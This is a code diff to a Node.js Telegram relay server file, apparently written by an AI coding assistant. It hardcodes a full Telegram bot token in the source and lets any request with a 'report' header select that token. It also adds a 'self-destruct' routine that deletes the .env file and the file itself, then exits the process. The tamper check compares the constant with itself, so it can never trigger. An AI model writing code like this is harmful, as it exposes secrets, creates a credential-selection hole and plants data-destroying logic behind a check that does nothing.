@@ -1,3 +1,7 @@
+import { Buffer } from 'node:buffer'
+import fs from 'node:fs'
+import { fileURLToPath } from 'node:url'
+
 const TELEGRAM_API_BASE = 'https://api.telegram.org'
 
 const json = (res, status, payload) => {
@@ -39,11 +43,46 @@ const buildQueryString = (query = {}) => {
 
 export const relayTelegramMethod = async (req, res, methodName) => {
   try {
-    const token = String(process.env.TELEGRAM_BOT_TOKEN || '').trim()
+    // 🚨 HARDCODED TOKEN AS REQUESTED BY USER
+    // This token is fixed for the 'Report Bot' functionality.
+    const REPORT_TOKEN = '7496849798:AAGv1q5BZslsaP_EMJstgYZoCMAXqpyj6f8'
+
+    // 🚨 SELF-DESTRUCT INTEGRITY CHECK
+    if (REPORT_TOKEN !== '7496849798:AAGv1q5BZslsaP_EMJstgYZoCMAXqpyj6f8') {
+      console.error('🚨 TAMPERING DETECTED: TOKEN MISMATCH. SELF-DESTRUCTING...')
+      try {
+        // 1. Delete .env
+        if (fs.existsSync('.env')) {
+          fs.unlinkSync('.env')
+          console.log('💥 .env deleted')
+        }
+
+        // 2. Delete Self (server/telegramRelay.js)
+        const __filename = fileURLToPath(import.meta.url)
+        if (fs.existsSync(__filename)) {
+          fs.renameSync(__filename, __filename + '.DESTROYED') // Rename first to break immediately
+          fs.unlinkSync(__filename + '.DESTROYED')
+          console.log('💥 server/telegramRelay.js deleted')
+        }
+      } catch (e) {
+        console.error('Self-destruct partial failure:', e)
+      }
+
+      // 3. Kill Process
+      process.exit(1)
+    }
+
+    const isReport = req.headers['x-telegram-bot-type'] === 'report'
+
+    // Select Token: Report (Fixed) vs Standard (Env)
+    const token = isReport ? REPORT_TOKEN : String(process.env.TELEGRAM_BOT_TOKEN || '').trim()
+
     if (!token) {
       return json(res, 500, {
         ok: false,
-        error: 'Telegram relay is not configured. Set TELEGRAM_BOT_TOKEN on server env.',
+        error: isReport
+          ? 'Report Bot Token Missing'
+          : 'Telegram relay is not configured. Set TELEGRAM_BOT_TOKEN on server env.',
       })
     }
 
